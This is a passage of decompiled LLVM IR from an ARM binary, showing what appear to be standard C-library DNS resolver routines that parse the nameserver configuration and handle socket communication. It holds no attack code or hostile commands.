dec_label_pc_114a8:                               ; preds = %dec_label_pc_11494
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_114b0 = add i32 %v0_1146c, 16
  %v2_114b0 = inttoptr i32 %v1_114b0 to i32*
  %v3_114b0 = load i32, i32* %v2_114b0, align 4
  %v2_114b4 = sub i32 %tmp159, %stack_var_-452.061
  %v1_114b8 = add i32 %v2_114b4, -1
  store i32 %v1_114b8, i32* %r3.global-to-local, align 4
  %v1_114bc = add i32 %v3_114b0, 4
  %v2_114c0 = mul i32 %v1_114bc, %v1_114b8
  store i32 %v2_114c0, i32* %r1.global-to-local, align 4
  %v1_114c4 = add i32 %v0_1146c, 32
  %v2_114c4 = inttoptr i32 %v1_114c4 to i32*
  %v3_114c4 = load i32, i32* %v2_114c4, align 4
  %v3_114c8 = icmp uge i32 %v2_114c0, %v3_114c4
  store i1 %v3_114c8, i1* %cpsr_c.global-to-local, align 1
  %v2_114cc = add i32 %v0_1146c, 36
  %v3_114cc = inttoptr i32 %v2_114cc to i32*
  store i32 %v1_114b8, i32* %v3_114cc, align 4
  %tmp286 = icmp ugt i32 %v2_114c0, %v3_114c4
  br i1 %tmp286, label %dec_label_pc_11564, label %dec_label_pc_114d4

dec_label_pc_114d4:                               ; preds = %dec_label_pc_114a8
  store i32 0, i32* @r7, align 4
  %v1_114dc = load i32, i32* @fp, align 4
  %v2_114dc = add i32 %v1_114dc, 36
  %v3_114dc = inttoptr i32 %v2_114dc to i32*
  store i32 0, i32* %v3_114dc, align 4
  br label %dec_label_pc_1153c

dec_label_pc_114e4:                               ; preds = %dec_label_pc_1143c
  store i32 %v2_1137c, i32* @r0, align 4
  %v0_114e8 = call i32 @free()
  store i32 %v5_113d0, i32* %r3.global-to-local, align 4
  store i32 %v0_10e6c, i32* @ip, align 4
  %v3_114f4 = icmp uge i32 %v5_113d0, %v0_10e6c
  store i1 %v3_114f4, i1* %cpsr_c.global-to-local, align 1
  %v9_114f4 = icmp eq i32 %v5_113d0, %v0_10e6c
  br i1 %v9_114f4, label %dec_label_pc_114fc, label %dec_label_pc_1153c

dec_label_pc_114fc:                               ; preds = %dec_label_pc_114e4
  %v0_114fc = load i32, i32* @fp, align 4
  %v1_114fc = add i32 %v0_114fc, 16
  %v2_114fc = inttoptr i32 %v1_114fc to i32*
  %v3_114fc = load i32, i32* %v2_114fc, align 4
  store i32 %v3_114fc, i32* %r1.global-to-local, align 4
  store i32 %v5_113c8, i32* %r3.global-to-local, align 4
  %v3_11504 = icmp uge i32 %v3_114fc, %v5_113c8
  store i1 %v3_11504, i1* %cpsr_c.global-to-local, align 1
  %v9_11504 = icmp eq i32 %v3_114fc, %v5_113c8
  br i1 %v9_11504, label %dec_label_pc_11518, label %dec_label_pc_1150c

dec_label_pc_1150c:                               ; preds = %dec_label_pc_114fc
  %v1_1150c = inttoptr i32 %v0_114fc to i32*
  %v2_1150c = load i32, i32* %v1_1150c, align 4
  store i32 %v2_1150c, i32* @r0, align 4
  %v0_11510 = call i32 @free()
  br label %dec_label_pc_1158c

dec_label_pc_11518:                               ; preds = %dec_label_pc_114fc
  %v1_11518 = add i32 %v0_114fc, 36
  %v2_11518 = inttoptr i32 %v1_11518 to i32*
  %v3_11518 = load i32, i32* %v2_11518, align 4
  %v1_1151c = add i32 %v0_114fc, 28
  %v2_1151c = inttoptr i32 %v1_1151c to i32*
  %v3_1151c = load i32, i32* %v2_1151c, align 4
  store i32 %v3_1151c, i32* @r3, align 4
  %v3_11520 = mul i32 %v3_11518, %v5_113c8
  %v4_11520 = add i32 %v3_1151c, %v3_11520
  store i32 %v4_11520, i32* @r0, align 4
  store i32 %v5_113c8, i32* @r2, align 4
  store i32 %v1_113e8, i32* @r1, align 4
  %v0_1152c = call i32 @memcpy()
  %v0_11530 = load i32, i32* @fp, align 4
  %v1_11530 = add i32 %v0_11530, 36
  %v2_11530 = inttoptr i32 %v1_11530 to i32*
  %v3_11530 = load i32, i32* %v2_11530, align 4
  %v1_11534 = add i32 %v3_11530, 1
  store i32 %v1_11534, i32* %r3.global-to-local, align 4
  store i32 %v1_11534, i32* %v2_11530, align 4
  br label %dec_label_pc_1153c

dec_label_pc_1153c:                               ; preds = %bb228, %dec_label_pc_114e4, %dec_label_pc_114d4, %dec_label_pc_11518
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_11518 ], [ 0, %dec_label_pc_114e4 ], [ 0, %dec_label_pc_114d4 ], [ 1, %bb228 ]
  %v1_11544 = load i32, i32* @r4, align 4
  %v1_11548 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_11548, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_1155c = icmp uge i32 %v1_11548, %tmp159
  store i1 %v3_1155c, i1* %cpsr_c.global-to-local, align 1
  %v5_11560 = icmp slt i32 %v1_11548, %tmp159
  br i1 %v5_11560, label %dec_label_pc_1153c.dec_label_pc_11334_crit_edge, label %dec_label_pc_11564

dec_label_pc_1153c.dec_label_pc_11334_crit_edge:  ; preds = %dec_label_pc_1153c
  %v2_11544 = add i32 %v1_11544, %stack_var_-460.364
  %v0_11338.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_11334

dec_label_pc_11564:                               ; preds = %dec_label_pc_1142c, %dec_label_pc_11310, %dec_label_pc_1153c, %dec_label_pc_11478, %dec_label_pc_114a8, %bb227
  %v1_11568 = call i32 @__GI_close(i32 %v3_1113c)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11570 = icmp eq i32 %arg3, 0
  br i1 %v2_11570, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_11564
  %v1_11578 = load i32, i32* @sl, align 4
  %v3_11574 = inttoptr i32 %arg3 to i32*
  store i32 %v1_11578, i32* %v3_11574, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_11564
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_11580.357 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11570, i32 ptrtoint (i32* @global_var_bd70.236 to i32))
  store i32 %v1_10eb4, i32* @r0, align 4
  %v0_11584 = call i32 @free()
  br label %dec_label_pc_115f4

dec_label_pc_1158c:                               ; preds = %thread-pre-split, %dec_label_pc_11188, %dec_label_pc_112e8, %dec_label_pc_112e0, %dec_label_pc_11290, %dec_label_pc_1129c, %dec_label_pc_112a8thread-pre-split, %thread-pre-split.thread, %dec_label_pc_11260, %dec_label_pc_1142c, %dec_label_pc_11420, %dec_label_pc_1114c, %dec_label_pc_1112c, %dec_label_pc_1150c
  %v1_11590 = add i32 %v0_11050, 1
  store i32 %v1_11590, i32* @r5, align 4
  br label %dec_label_pc_1159c

dec_label_pc_1159c:                               ; preds = %.thread7, %dec_label_pc_1158c
  %storemerge22 = phi i32 [ -1, %dec_label_pc_1158c ], [ %v7_1124c, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_11590, %dec_label_pc_1158c ], [ %v0_11050, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_115a0 = add i32 %stack_var_-476.1, -1
  store i32 %v1_115a0, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_115a0, 1
  br i1 %tmp232, label %dec_label_pc_115bc, label %dec_label_pc_10f54

dec_label_pc_115b4:                               ; preds = %dec_label_pc_11100, %bb218, %bb213, %.thread5, %dec_label_pc_10ed0
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_115bc

dec_label_pc_115bc:                               ; preds = %dec_label_pc_1159c, %.thread132, %dec_label_pc_115b4
  %stack_var_-472.1 = phi i32 [ %v1_10eb4, %dec_label_pc_115b4 ], [ 0, %.thread132 ], [ %v1_10eb4, %dec_label_pc_1159c ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_115b4 ], [ -1, %.thread132 ], [ %v3_1113c, %dec_label_pc_1159c ]
  %v0_115bc = call i32 @__GI___h_errno_location()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_115c8 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_115c8, i1* %cpsr_c.global-to-local, align 1
  %v7_115c8 = icmp eq i32 %stack_var_-488.2, -1
  %v2_115cc = inttoptr i32 %v0_115bc to i32*
  store i32 -1, i32* %v2_115cc, align 4
  br i1 %v7_115c8, label %dec_label_pc_115dc, label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %dec_label_pc_115bc, %dec_label_pc_11288
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_115bc ], [ %v1_10eb4, %dec_label_pc_11288 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_115bc ], [ %v3_1113c, %dec_label_pc_11288 ]
  %v1_115d8 = call i32 @__GI_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_115dc

dec_label_pc_115dc:                               ; preds = %dec_label_pc_115bc, %dec_label_pc_115d4
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_115bc ], [ %stack_var_-472.2, %dec_label_pc_115d4 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_115e0 = call i32 @free()
  %v0_115e4 = load i32, i32* @sl, align 4
  store i32 %v0_115e4, i32* @r0, align 4
  %v0_115e8 = call i32 @free()
  br label %dec_label_pc_115f4

dec_label_pc_115f4:                               ; preds = %bb231, %dec_label_pc_115dc
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_115dc ], [ %v5_111c4, %bb231 ]
  store i32 %v3_10e58, i32* @r4, align 4
  store i32 %v6_10e58, i32* @r5, align 4
  store i32 %v9_10e58, i32* @r6, align 4
  store i32 %v12_10e58, i32* @r7, align 4
  store i32 %v15_10e58, i32* @r8, align 4
  store i32 %v18_10e58, i32* @sb, align 4
  store i32 %v21_10e58, i32* @sl, align 4
  store i32 %v24_10e58, i32* @fp, align 4
  store i32 %v27_10e58, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_115a0, { 1, 2, 0 }
  uselistorder i32 %v1_11548, { 1, 2, 3, 0 }
  uselistorder i32 %v0_114fc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_114b8, { 1, 0, 2 }
  uselistorder i32 %v2_113f0, { 1, 0 }
  uselistorder i32 %v5_113c8, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_11388, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_11384, { 1, 0 }
  uselistorder i32 %v2_11368, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_11364, { 1, 0 }
  uselistorder i32 %v1_11360, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_112e0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_112bc, { 1, 0 }
  uselistorder i32 %v3_112b0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_112b0, { 0, 2, 1 }
  uselistorder i32 %v2_112a0, { 0, 2, 1 }
  uselistorder i1 %v7_111d4, { 1, 0 }
  uselistorder i32 %v1_111d4, { 1, 0 }
  uselistorder i32 %v0_111d4, { 1, 0 }
  uselistorder i32 %v5_111c4, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_1113c, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_110f4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11080, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_11068, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_1105c, { 1, 0 }
  uselistorder i32 %v0_11050, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v0_11008, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v7_10f58, { 1, 0 }
  uselistorder i32 %v1_10f5c, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_11318, { 1, 0, 2 }
  uselistorder i32 %v1_11228, { 2, 0, 1 }
  uselistorder i32 %v2_110b0, { 1, 0, 2 }
  uselistorder i32 %v2_11088, { 1, 0 }
  uselistorder i32 %v0_10ed0, { 1, 0, 2 }
  uselistorder i32 %v1_10eb4, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v3_10e80, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_10e6c, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 19, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 54, 20, 21, 53, 2, 22, 23, 24, 25, 26, 27, 28, 1, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 2, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 29, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 19, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 54, 17, 18, 55, 20, 21, 22, 23, 24, 52, 25, 26, 27, 28, 29, 30, 31, 32, 33, 53, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder i32 (i32)* @__GI_close, { 4, 3, 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__GI___h_errno_location, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 1000, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_send, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 2, 0 }
  uselistorder i32 27, { 2, 1, 0 }
  uselistorder i32 9512, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_115f4, { 1, 0 }
  uselistorder label %dec_label_pc_115dc, { 1, 0 }
  uselistorder label %dec_label_pc_115bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_115b4, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1159c, { 1, 0 }
  uselistorder label %dec_label_pc_1158c, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_11564, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_1153c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_11494, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11420, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_11334, { 1, 0 }
  uselistorder label %dec_label_pc_112e0, { 1, 0 }
  uselistorder label %dec_label_pc_112b0, { 1, 0 }
  uselistorder label %dec_label_pc_11288, { 1, 0 }
  uselistorder label %dec_label_pc_111d4, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_11030, { 1, 0 }
  uselistorder label %dec_label_pc_10ff4, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @"$d"(i64* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11604:
  %v0_11604 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11604, label %.thread5, label %.thread13

.thread5:                                         ; preds = %dec_label_pc_11604
  call void @llvm.trap()
  unreachable

.thread13:                                        ; preds = %dec_label_pc_11604
  %tmp = ptrtoint i64* %arg1 to i32
  ret i32 %tmp
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 140, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11698 = load i32, i32* @r4, align 4
  store i32 %v3_11698, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @ip, align 4
  store i32 140, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_116a8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_116a89 = inttoptr i32 %v0_116a8.pre to i8*
  %v2_116a810 = load i8, i8* %v1_116a89, align 1
  %v2_116ac12 = icmp eq i8 %v2_116a810, 0
  store i1 %v2_116ac12, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116ac12, label %dec_label_pc_116dc, label %dec_label_pc_116b8

dec_label_pc_116b8:                               ; preds = %entry, %bb8.dec_label_pc_116b8_crit_edge
  %v1_116b8 = phi i32 [ %v1_116b8.pre, %bb8.dec_label_pc_116b8_crit_edge ], [ 140, %entry ]
  %v0_116b8 = phi i32 [ %v0_116b8.pre, %bb8.dec_label_pc_116b8_crit_edge ], [ ptrtoint (i32* @global_var_1f010.69 to i32), %entry ]
  %v2_116a816 = phi i8 [ %v2_116a8, %bb8.dec_label_pc_116b8_crit_edge ], [ %v2_116a810, %entry ]
  %v2_116b017.in.in = phi i8 [ %v2_116a8, %bb8.dec_label_pc_116b8_crit_edge ], [ %v2_116a810, %entry ]
  %v1_116a815 = phi i8* [ %v1_116a8, %bb8.dec_label_pc_116b8_crit_edge ], [ %v1_116a89, %entry ]
  %v2_116d014 = phi i32 [ %v2_116d4, %bb8.dec_label_pc_116b8_crit_edge ], [ %v0_116a8.pre, %entry ]
  %v2_116b017.in = zext i8 %v2_116b017.in.in to i32
  %v2_116b017 = mul nuw nsw i32 %v2_116b017.in, 2
  %v2_116b8 = add i32 %v1_116b8, %v0_116b8
  %v3_116b8 = inttoptr i32 %v2_116b8 to i32*
  %v4_116b8 = load i32, i32* %v3_116b8, align 4
  %v2_116bc = add i32 %v4_116b8, %v2_116b017
  %v3_116bc = inttoptr i32 %v2_116bc to i16*
  %v4_116bc = load i16, i16* %v3_116bc, align 2
  %v1_116c0 = and i16 %v4_116bc, 32
  %v2_116c0 = icmp eq i16 %v1_116c0, 0
  store i1 %v2_116c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116c0, label %dec_label_pc_116dc, label %dec_label_pc_116c8

dec_label_pc_116c8:                               ; preds = %dec_label_pc_116b8
  %v7_116c8 = icmp eq i8 %v2_116a816, 35
  br i1 %v7_116c8, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_116c8
  %v8_116cc = icmp eq i8 %v2_116a816, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_116c8, %bb
  %storemerge = phi i1 [ %v8_116cc, %bb ], [ %v7_116c8, %dec_label_pc_116c8 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_116d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_116d0 = trunc i32 %v0_116d0 to i8
  store i8 %v1_116d0, i8* %v1_116a815, align 1
  %v0_116d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_116e0.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_116d4, label %dec_label_pc_116dc, label %bb8

bb8:                                              ; preds = %bb7
  %v2_116d4 = add i32 %v1_116e0.pre, 1
  store i32 %v2_116d4, i32* %r0.global-to-local, align 4
  %v1_116a8 = inttoptr i32 %v2_116d4 to i8*
  %v2_116a8 = load i8, i8* %v1_116a8, align 1
  %v2_116ac = icmp eq i8 %v2_116a8, 0
  store i1 %v2_116ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116ac, label %dec_label_pc_116dc, label %bb8.dec_label_pc_116b8_crit_edge

bb8.dec_label_pc_116b8_crit_edge:                 ; preds = %bb8
  %v0_116b8.pre = load i32, i32* @ip, align 4
  %v1_116b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_116b8

dec_label_pc_116dc:                               ; preds = %bb8, %dec_label_pc_116b8, %bb7, %entry
  %v1_116e0 = phi i32 [ %v0_116a8.pre, %entry ], [ %v1_116e0.pre, %bb7 ], [ %v2_116d014, %dec_label_pc_116b8 ], [ %v2_116d4, %bb8 ]
  %v2_116dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_116dc, i32* @r4, align 4
  ret i32 %v1_116e0

; uselistorder directives
  uselistorder i8 %v2_116a8, { 2, 1, 0 }
  uselistorder i8* %v1_116a8, { 1, 0 }
  uselistorder i32 %v2_116d4, { 0, 2, 3, 1 }
  uselistorder i1 %v2_116c0, { 1, 0 }
  uselistorder i8 %v2_116a816, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 1, 0, 2, 4 }
  uselistorder label %dec_label_pc_116dc, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_116b8, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_116ec = load i32, i32* @r4, align 4
  store i32 %v3_116ec, i32* %stack_var_-36, align 4
  %v15_116ec = load i32, i32* @r8, align 4
  %v18_116ec = load i32, i32* @sb, align 4
  %v21_116ec = load i32, i32* @sl, align 4
  %v24_116ec = load i32, i32* @fp, align 4
  %v27_116ec = load i32, i32* @lr, align 4
  store i32 10468, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r5, align 4
  %v4_116fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 10468) to i32*), align 4
  store i32 %v4_116fc, i32* @r4, align 4
  %v2_11700 = icmp eq i32 %v4_116fc, 0
  br i1 %v2_11700, label %dec_label_pc_1170c, label %dec_label_pc_1173c

dec_label_pc_1170c:                               ; preds = %entry
  %v2_11710 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_11710, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37280), i32* %r0.global-to-local, align 4
  %v2_11718 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37280), i32 %v2_11710)
  store i32 %v2_11718, i32* %r0.global-to-local, align 4
  %v2_1171c = icmp eq i32 %v2_11718, 0
  %v1_11720 = load i32, i32* @r4, align 4
  %.v1_11720 = select i1 %v2_1171c, i32 %tmp38, i32 %v1_11720
  store i32 9540, i32* %r1.global-to-local, align 4
  store i32 %.v1_11720, i32* %r2.global-to-local, align 4
  %v0_1172c = load i32, i32* @r5, align 4
  %v2_1172c = add i32 %v0_1172c, 9540
  %v3_1172c = inttoptr i32 %v2_1172c to i32*
  %v4_1172c = load i32, i32* %v3_1172c, align 4
  store i32 %v4_1172c, i32* %r3.global-to-local, align 4
  %v9_11730 = icmp eq i32 %v4_1172c, %.v1_11720
  br i1 %v9_11730, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_1170c
  store i32 %.v1_11720, i32* %v3_1172c, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_1170c, %bb
  store i32 71484, i32* @lr, align 4
  %v1_11738 = xor i1 %v9_11730, true
  call void @__pseudo_cond_branch(i1 %v1_11738, i32 ptrtoint (i32* @global_var_11b48.366 to i32))
  %v0_11740.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1173c

dec_label_pc_1173c:                               ; preds = %entry, %bb58
  %v2_11754 = phi i32 [ ptrtoint (i32* @global_var_1f010.69 to i32), %entry ], [ %v0_11740.pre, %bb58 ]
  store i32 10480, i32* %r3.global-to-local, align 4
  %v2_11740 = add i32 %v2_11754, 10480
  %v3_11740 = inttoptr i32 %v2_11740 to i32*
  %v4_11740 = load i32, i32* %v3_11740, align 4
  store i32 %v4_11740, i32* %r3.global-to-local, align 4
  %v2_11744 = icmp eq i32 %v4_11740, 0
  br i1 %v2_11744, label %dec_label_pc_1174c, label %dec_label_pc_11ae0

dec_label_pc_1174c:                               ; preds = %dec_label_pc_1173c
  %v4_11754 = add i32 %v2_11754, 726
  %v5_11754 = inttoptr i32 %v4_11754 to i8*
  store i8 5, i8* %v5_11754, align 1
  store i32 -37280, i32* %r0.global-to-local, align 4
  store i32 727, i32* %r3.global-to-local, align 4
  store i32 -37396, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v3_11768 = load i32, i32* @r5, align 4
  %v5_11768 = add i32 %v3_11768, 727
  %v6_11768 = inttoptr i32 %v5_11768 to i8*
  store i8 3, i8* %v6_11768, align 1
  %v0_1176c = load i32, i32* @r5, align 4
  %v1_1176c = load i32, i32* %r0.global-to-local, align 4
  %v2_1176c = add i32 %v1_1176c, %v0_1176c
  store i32 %v2_1176c, i32* @r0, align 4
  %v1_11770 = load i32, i32* %r1.global-to-local, align 4
  %v2_11770 = add i32 %v1_11770, %v0_1176c
  store i32 %v2_11770, i32* @r1, align 4
  %v5_11774 = call i32 @__GI_fopen(i32 %v2_1176c, i32 %v2_11770, i32 3, i32 727)
  store i32 %v5_11774, i32* %r0.global-to-local, align 4
  store i32 %v5_11774, i32* @fp, align 4
  %v2_11778 = icmp eq i32 %v5_11774, 0
  br i1 %v2_11778, label %dec_label_pc_11a04, label %dec_label_pc_119ac

dec_label_pc_11784:                               ; preds = %dec_label_pc_119ac, %dec_label_pc_119e0.backedge
  store i32 %v2_119e0, i32* %r0.global-to-local, align 4
  %v2_11788 = call i32 @skip_and_NUL_space(i8* %v1_11788)
  store i32 %v2_11788, i32* %r0.global-to-local, align 4
  store i32 %v2_11788, i32* @r4, align 4
  %v0_11790 = call i32 @skip_nospace()
  store i32 %v0_11790, i32* %r0.global-to-local, align 4
  %v1_11794 = inttoptr i32 %v0_11790 to i8*
  %v2_11794 = call i32 @skip_and_NUL_space(i8* %v1_11794)
  store i32 %v2_119b0, i32* @r1, align 4
  store i32 %v2_11794, i32* @r7, align 4
  %v0_117a0 = load i32, i32* @r4, align 4
  store i32 %v0_117a0, i32* %r0.global-to-local, align 4
  %v2_117a4 = inttoptr i32 %v0_117a0 to i8*
  %v3_117a4 = call i32 @__GI_strcoll(i8* %v2_117a4, i32 %v2_119b0)
  store i32 %v3_117a4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_117a4, 16777216
  %v1_117a8 = sdiv i32 %sext, 16777216
  store i32 %v1_117a8, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_117b0, label %dec_label_pc_1186c

dec_label_pc_117b0:                               ; preds = %dec_label_pc_11784
  %v0_117b0 = load i32, i32* @r7, align 4
  store i32 %v0_117b0, i32* %r0.global-to-local, align 4
  %v0_117b4 = call i32 @skip_nospace()
  %v1_117b4 = inttoptr i32 %v0_117b4 to i8*
  store i32 %v2_117b8, i32* @r4, align 4
  %v0_117bc = load i32, i32* @r6, align 4
  %v1_117bc = trunc i32 %v0_117bc to i8
  store i8 %v1_117bc, i8* %v1_117b4, align 1
  %v0_117c0 = load i32, i32* @r6, align 4
  store i32 %v0_117c0, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_117b8, i32* %r0.global-to-local, align 4
  %v3_117cc = call i32 @__GI_memset(i8* %v2_117cc, i32 %v0_117c0)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_117d4 = load i32, i32* @r7, align 4
  store i32 %v0_117d4, i32* %r1.global-to-local, align 4
